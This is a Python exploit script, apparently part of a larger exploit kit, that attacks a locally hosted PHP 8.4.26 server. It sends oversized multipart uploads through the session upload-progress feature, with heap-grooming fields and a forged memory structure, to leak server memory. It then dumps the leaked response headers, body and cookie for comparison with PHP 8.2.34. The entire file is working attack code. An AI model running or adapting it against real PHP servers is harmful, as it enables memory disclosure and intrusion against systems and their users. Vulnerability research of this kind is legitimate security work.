"""Dump FULL leak response (headers + body) for 8.4.26 to compare with 8.2.34."""
import sys, os, time, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import exploit as E

for port, label in [(18113, "8.4.26")]:
    URL = f"http://127.0.0.1:{port}/"
    t = E.Target(URL, timeout=90.0, verbose=False)
    parts = [{"name": f"p{i:04d}", "data": b"x"} for i in range(1001)]
    parts += [
        {"name": "PHPSESSID", "data": b"\x00"},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
        {"name": "f", "filename": "a.txt", "data": b"A" * 64},
        {"name": "big", "data": b"B" * (12 * 1024 * 1024)},
    ]
    t.post(E.build_multipart(parts, b"S" * 17), b"S" * 17, read_cap=1 << 20, timeout=90.0)
    time.sleep(0.4)
    parts = [
        {"name": "PHPSESSID", "data": E.SID},
        {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"},
    ]
    for i in range(841):
        val = (f"v{i:04d}" + "x" * 44)[:48]
        parts.append({"name": str(1000 + i), "data": val.encode()})
    forge = bytearray(b"A" * 79)
    struct.pack_into("<Q", forge, 0x10, 0x1000)
    forge[0x18] = ord("L")
    parts.append({"name": "1999", "data": bytes(forge)})
    r2 = t.post(E.build_multipart(parts, b"B" * 10), b"B" * 10, read_cap=9 << 20, timeout=90.0)
    head, _, body = r2.partition(b"\r\n\r\n")
    print(f"===== {label} HEADERS =====", flush=True)
    print(head.decode("latin1"), flush=True)
    print(f"===== {label} BODY (first 500B) =====", flush=True)
    print(body[:500].decode("latin1", "replace"), flush=True)
    raw = E.parse_cookie(r2)
    print(f"===== cookie len = {len(raw)} =====", flush=True)
